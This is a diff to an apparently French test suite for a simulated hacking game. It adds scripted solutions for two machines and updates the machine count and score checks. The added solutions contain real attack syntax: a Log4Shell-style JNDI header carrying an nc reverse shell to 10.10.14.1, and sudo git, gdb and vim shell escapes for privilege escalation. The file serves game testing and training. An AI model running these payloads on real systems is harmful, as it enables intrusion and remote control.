@@ -310,6 +310,31 @@ const MACHINE_SOLUTIONS = {
     run(ctx, "sudo vim -c ':!/bin/sh'");
     return run(ctx, "cat /root/root.txt");
   },
+  relic: (ctx) => {
+    run(ctx, "nmap 10.10.11.140");
+    run(ctx, "curl http://10.10.11.140/");
+    run(ctx, "curl http://10.10.11.140/.git/HEAD");
+    run(ctx, "git log 10.10.11.140");
+    run(ctx, "git show 10.10.11.140 4d5e6f");
+    run(ctx, "ssh gkessler@10.10.11.140");
+    pass(ctx, "R3lic_G1t_H1st0ry!41");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo git -p help config");
+    run(ctx, "!sh");
+    return run(ctx, "cat /root/root.txt");
+  },
+  echolog: (ctx) => {
+    run(ctx, "exit"); // pour attraper le callback, être sur sa propre box
+    run(ctx, "nmap 10.10.11.205");
+    run(ctx, "curl http://10.10.11.205:8081/");
+    run(ctx, "nc -lvnp 4444");
+    run(ctx, "curl -H 'User-Agent: ${jndi:ldap://10.10.14.1:1389/x;nc 10.10.14.1 4444 -e /bin/sh}' http://10.10.11.205:8081/api/status");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo gdb -nx -ex '!sh' -ex quit");
+    return run(ctx, "cat /root/root.txt");
+  },
   axiom: (ctx) => {
     run(ctx, "nmap 10.10.11.244");
     run(ctx, "curl http://10.10.11.244:8080/");
@@ -325,11 +350,11 @@ const MACHINE_SOLUTIONS = {
   },
 };
 
-section("Machines : recon -> accès -> privesc -> flags (les 18 machines)", () => {
+section("Machines : recon -> accès -> privesc -> flags (les 20 machines)", () => {
   const ctx = freshContext();
   unlockAll(ctx);
   const machines = get(ctx, "MACHINES");
-  assertEqual(machines.length, 18, "18 machines définies dans MACHINES");
+  assertEqual(machines.length, 20, "20 machines définies dans MACHINES");
 
   let totalScoreCheck = 0;
   for (const m of machines) {
@@ -344,11 +369,11 @@ section("Machines : recon -> accès -> privesc -> flags (les 18 machines)", () =
   }
 
   const finalScore = get(ctx, "GAME.score");
-  // 18 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 18 * 800 = 14400
-  assertEqual(finalScore, 14400, "score total cohérent après les 18 machines (100+150+250+100+200 par machine)");
+  // 20 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 20 * 800 = 16000
+  assertEqual(finalScore, 16000, "score total cohérent après les 20 machines (100+150+250+100+200 par machine)");
 
   const badges = get(ctx, "GAME.badges");
-  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 18 machines");
+  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 20 machines");
 });
 
 section("Lore transversal : note_interne.txt présent sur chaque machine sans fausser le score", () => {
@@ -546,7 +571,7 @@ section("nc : connexion bannière", () => {
 section("validateMachines : garde-fou de schéma", () => {
   const ctx = freshContext();
   const cleanErrors = get(ctx, "validateMachines(MACHINES)");
-  assertEqual(cleanErrors.length, 0, `les 18 machines réelles ne remontent aucune erreur de schéma (obtenu : ${JSON.stringify(cleanErrors)})`);
+  assertEqual(cleanErrors.length, 0, `les 20 machines réelles ne remontent aucune erreur de schéma (obtenu : ${JSON.stringify(cleanErrors)})`);
 
   const broken = get(ctx, `
     (() => {
